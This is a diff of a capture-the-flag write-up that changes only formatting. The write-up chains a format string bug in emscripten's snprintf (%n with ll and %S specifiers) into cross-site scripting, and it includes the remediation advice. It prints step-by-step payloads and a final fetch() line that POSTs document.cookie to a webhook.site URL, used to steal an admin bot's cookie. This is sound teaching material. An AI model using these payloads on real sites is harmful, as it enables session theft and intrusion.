@@ -87,13 +87,16 @@ Thus we need to exploit the format string vulnerability to introduce a `<` chara
 
 After looking at the `printf(3)` man page, the interesting part of the syntax for format string specifiers boils down to this:
 
-`%[argument$][width][length modifier]conversion` 
+```%[argument$][width][length modifier]conversion```
 
 `conversion` is interesting, because there is the little known `n` specifier which allows us use an argument as a pointer and to write the number of characters that have been printed so far to that pointer, thus giving us a limited ability to write memory.
 Furthermore, there are the `s` and `S` specifiers which allow use to print strings from memory.
 These specifiers will be the basis of the exploit, because we will try to:
+
 1. print 60 characters (the ascii code for `<`)
+
 2. use the `n` specifier to store that count in memory
+
 3. print that count as a character
 
 This way we should be to introduce `<` into the output *after* that character was filtered out previously.
@@ -118,15 +121,15 @@ In order to do this we can simply use a format string like `%d;%d;%d;%d;` as our
 Looking at these values the situation is rather simple: The first three arguments are all out of bounds and all the values after that are zero. Thus, with zero being the only valid memory address out of the bunch, we choose the fourth argument for writing our character to memory.
 Therefore, our payload now looks like this:
 
-`%1$ 60d%4$n`
+```%1$ 60d%4$n```
 
 Next, we need to read the value from memory and print it as a character.
-The format specifier you would normally use for this is `s`, however, trying to do this here will only print `(null)` because the address is `0`.
+The format specifier you would normally use for this is `s`, however, trying to do this here will only print '`(null)`' because the address is `0`.
 At this point I started looking at the way that `snprintf` is [implemented in emscripten](https://github.com/emscripten-core/emscripten/blob/99b77d04f9bf8857673e2c909c58030b8a3e45f9/system/lib/libc/musl/src/stdio/vfprintf.c#L482), the compiler used by the Makefile, to look for a way to circumvent this behaviour.
 What I found was that the other specifier for printing strings, `S`, which prints wide chars does not have this check at all.
-So, we can use `%4$S` to print the `<` from address `0` without having it print `(null)` instead, which leads us to this payload:
+So, we can use `%4$S` to print the `<` from address `0` without having it print '`(null)`' instead, which leads us to this payload:
 
-`%1$ 60d%4$n%4$S`
+```%1$ 60d%4$n%4$S```
 
 Trying out this new version of the payload shows a new problem however.
 Because while the first wide char is indeed `<` as intended the second one is not printable which causes an exception and leads to nothing being printed.
@@ -134,21 +137,21 @@ This is where the `[length modifier]` I mentioned earlier comes in handy.
 This is because each character is stored at a 4 byte offset from the last one, so we can use `ll` when writing `<` to memory, which will write 8 bytes, and because of the endianness the first character will then still be `<`, but the second character will have been overwritten with a null byte which is the string terminator.
 After applying this change, our paylod now looks like this:
 
-`%1$ 60d%4$lln%4$S`
+```%1$ 60d%4$lln%4$S```
 
 Now we can add what is necessary to build an `img` with an `onerror` handler, like this:
 
-`%1$ 60d%4$lln%4$Simg src="" onerror="alert(1)">`
+```%1$ 60d%4$lln%4$Simg src="" onerror="alert(1)">```
 
 Finally we just need to add `%2$c%3$c` at the end in order to satisfy the requirement that there be no gaps in the arguments used with the `$`-notation. So, we now have a working proof of concept (note that this, of course, needs to be url encoded and added as the URL parameter `msg`):
 
-`%1$ 60d%4$lln%4$Simg src="" onerror="alert(1)"> %2$c%3$c`
+```%1$ 60d%4$lln%4$Simg src="" onerror="alert(1)"> %2$c%3$c```
 
 # Getting the Flag
 
 At this point, getting the flag is quite simple. We can just replace the `alert(1)` with a js payload to extract the cookies, like this one:
 
-`fetch('https://webhook.site/<insert_uuid_here>', {method: 'POST', mode: 'no-cors', body: document.cookie})`
+```fetch('https://webhook.site/<insert_uuid_here>', {method: 'POST', mode: 'no-cors', body: document.cookie})```
 
 And then we head to `/report` and submit the URL with our encoded payload, which, as mentioned earlier, will lead to an admin visiting that URL and to our js payload being executed.
 After that, we can observe a POST request, with the flag in the request body, being made to the URL from the payload.
@@ -156,7 +159,9 @@ After that, we can observe a POST request, with the flag in the request body, be
 # Fixing the Vulnerabilities
 
 There are two security related issues here that should be fixed:
+
 1. The usage of `snprintf` with user input as the format string.
+
 2. The usage of `innerHTML` with (improperly) filtered user input.
 
 Fixing the format string vulnerability is quite simple, as the call to `snprintf` could easily be replaced by a call to `memcpy` which would completely eliminate the format string vulnerability without any change in the normal behaviour of `echo`.
